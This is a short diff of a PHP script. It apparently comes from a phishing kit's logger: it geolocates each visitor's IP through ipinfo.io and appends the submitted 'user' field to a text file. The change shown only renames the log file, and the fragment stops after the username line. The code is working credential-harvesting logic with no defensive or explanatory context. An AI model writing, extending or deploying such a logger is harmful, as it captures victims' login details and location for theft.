@@ -7,7 +7,7 @@ $userp = $_SERVER['REMOTE_ADDR'];
 $cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
 $city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
 	
-	$file = fopen("NEW01.txt", "a");
+	$file = fopen("NEW.txt", "a");
 	
 fwrite($file, 
 "* USER: ".$_POST['user']."
